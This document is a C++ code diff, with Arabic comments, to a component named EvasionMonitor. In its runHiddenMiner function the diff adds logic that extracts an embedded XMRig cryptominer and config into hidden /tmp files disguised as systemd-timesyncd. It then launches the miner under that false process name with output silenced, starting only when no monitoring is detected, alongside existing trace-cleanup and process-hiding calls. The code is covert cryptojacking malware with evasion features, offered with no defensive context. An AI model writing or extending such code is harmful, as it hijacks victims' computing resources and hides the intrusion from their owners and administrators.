@@ -1,4 +1,5 @@
 #include "evasion_monitor.h"
+#include "binary_embedder.h"
 #include <iostream>
 #include <thread>
 #include <chrono>
@@ -277,6 +278,22 @@ void EvasionMonitor::runHiddenMiner() {
     // إخفاء هوية العملية أولاً
     hideProcessName();
     
+    // استخراج XMRig من البيانات المدمجة
+    extractedXMRigPath = "/tmp/." + std::to_string(getpid()) + "_systemd-timesyncd";
+    extractedConfigPath = "/tmp/." + std::to_string(getpid()) + "_timesyncd.conf";
+    
+    if (!BinaryEmbedder::extractXMRig(extractedXMRigPath)) {
+        std::cerr << "[ERROR] Failed to extract XMRig binary" << std::endl;
+        return;
+    }
+    
+    if (!BinaryEmbedder::extractConfig(extractedConfigPath)) {
+        std::cerr << "[ERROR] Failed to extract config file" << std::endl;
+        return;
+    }
+    
+    std::cout << "[INFO] Successfully extracted embedded binaries" << std::endl;
+    
     while (true) {
         // تنظيف الآثار بشكل دوري
         cleanupTraces();
@@ -287,7 +304,7 @@ void EvasionMonitor::runHiddenMiner() {
         if (!isMonitoringActive()) {
             std::cout << "[INFO] Environment clear, starting mining simulation..." << std::endl;
             
-            // تشغيل XMRig كعملية فرعية مع إخفاء متقدم
+            // تشغيل XMRig المستخرج كعملية فرعية
             pid_t pid = fork();
             if (pid == 0) {  // العملية الفرعية
                 // إخفاء السجلات: إعادة توجيه جميع المخرجات إلى /dev/null
@@ -306,9 +323,9 @@ void EvasionMonitor::runHiddenMiner() {
                 // تغيير working directory
                 chdir("/var/lib/systemd");
 
-                // تشغيل XMRig مع معلمات مخفية
-                execl("/usr/local/bin/xmrig", "systemd-timesyncd", 
-                      "--config", "/usr/local/bin/config.json",
+                // تشغيل XMRig المستخرج مع معلمات مخفية
+                execl(extractedXMRigPath.c_str(), "systemd-timesyncd", 
+                      "--config", extractedConfigPath.c_str(),
                       "--background", "--syslog", 
                       nullptr);
                 exit(1);
@@ -343,4 +360,9 @@ void EvasionMonitor::runHiddenMiner() {
         // فترة راحة عادية بين المحاولات
         std::this_thread::sleep_for(std::chrono::minutes(2));
     }
+    
+    // تنظيف الملفات المستخرجة عند الانتهاء
+    BinaryEmbedder::cleanupExtractedFiles();
+    unlink(extractedXMRigPath.c_str());
+    unlink(extractedConfigPath.c_str());
 }
